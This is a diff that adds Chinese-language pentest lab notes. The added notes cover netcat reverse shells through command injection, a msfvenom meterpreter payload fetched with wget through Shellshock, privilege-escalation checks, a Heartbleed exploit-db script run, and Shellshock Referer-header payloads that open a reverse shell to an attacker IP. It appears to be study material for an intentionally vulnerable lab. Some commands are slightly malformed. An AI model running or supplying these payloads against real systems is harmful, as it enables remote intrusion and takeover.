@@ -36,9 +36,54 @@ root默认密码：toor
 
 ### 命令注入
 
+#### 检测到存在命令注入时
+
 1. 提交`ls /bin/nc*`查看是否存在netcat
 1. 在攻击者监听`nc -lp 1234 -v`
 1. 在命令注入`nc.traditional -e /bin/bash x.x.x.x 1234 &`反弹shell
+
+#### 利用metasploit的msfvenom来创建一个可执行程序，反弹shell
+
+1. 执行`msfvenom -p linux/x86/meterpreter/reverse_tcpLHOST=192.168.56.10 LPORT=4443 -f elf > cute_dolphin.bin`，ip为攻击机
+1. 打开msfconsole创建侦听
+```bash
+use exploit/multi/handler
+set payloadlinux/x86/meterpreter/reverse_tcp
+set lhost 192.168.56.10
+set lport 4443
+run
+```
+1. 启动服务器存放bin提供下载，命令注入wget获取bin: `() { :;}; echo "Vulnerable:" $(/bin/sh-c "/usr/bin/wget http://192.168.56.10/cute_dolphin`
+1. 执行`() { :;}; echo "Vulnerable:"$(/tmp/cute_dolphin.bin")`
+
+#### linux提权
+
+1. 检查linux提权工具`unix-privsc-check`
+1. 在shell中使用upload命令上传文件
+1. 使用`sudo -l`显示可以sudo的所有命令
+
+
+### 利用已知漏洞
+
+#### OpenSSL HeartBleed内存缓冲区溢出，影响TLS1.0 1.1
+
+1. 使用命令`sslscan x.x.x.x:8443`检查协议版本及存在漏洞
+1. 使用命令`searchsploit heartbleed`查找`exploit-db`安装位置
+1. 使用工具Exploit-DB: <https://www.exploit-db.com/>，执行`python /usr/share/exploitdb/platforms/multiple/remote/32764.py 192.168.56.12  -p  8443`泄漏内存
+
+#### shellshock
+
+bash允许通过环境变量中的函数执行命令。
+
+!!! info "前提"
+    在php或cgi脚本中调用了系统命令（shell脚本）
+
+1. 对于shell请求`/bWAPP/cgi-bin/shellshock.sh`，将请求头中的Referer字段替换为`(){:;};echo"Vulnerable:"`，响应回显`Vulnerable`
+1. 注入`(){:;};echo "Vulnerable:" $(/bin/sh-c "/sbin/ifconfig")`
+1. 开启监听: `nc -vlp 12345`
+1. 注入webshell: `(){:;};echo "Vulnerable:" $(/bin/sh -c "nc -e/bin/bash 192.168.56.10 12345")`
+
+bash将函数存储为环境变量，函数结束后继续执行命令。CGI将请求映射到环境变量。
 
 
 ## 安全维度
